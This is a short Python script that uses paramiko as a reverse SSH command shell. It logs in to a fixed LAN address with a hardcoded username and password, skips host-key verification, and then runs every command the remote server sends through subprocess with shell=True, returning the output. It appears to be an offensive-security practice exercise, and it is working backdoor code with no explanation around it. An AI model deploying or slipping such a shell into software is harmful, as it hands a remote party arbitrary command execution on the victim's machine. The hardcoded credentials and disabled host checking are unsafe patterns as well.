import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
	client = paramiko.SSHClient()
	# client.load_host_keys('/home/tomas/.ssh/known_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip,username=user,password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command.encode('utf-8'))
		print(str(ssh_session.recv(1024)))
		while True:
			command = ((str(ssh_session.recv(1024)))[2:])[:-1]
			print(command)
			try:
				cmd_output = subprocess.check_output(command,shell=True)
				ssh_session.send(cmd_output)
			except Exception as e:
				ssh_session.send(str(e).encode('utf-8'))
		client.close()

ssh_command('192.168.0.104','tomas','root','ClientConnected')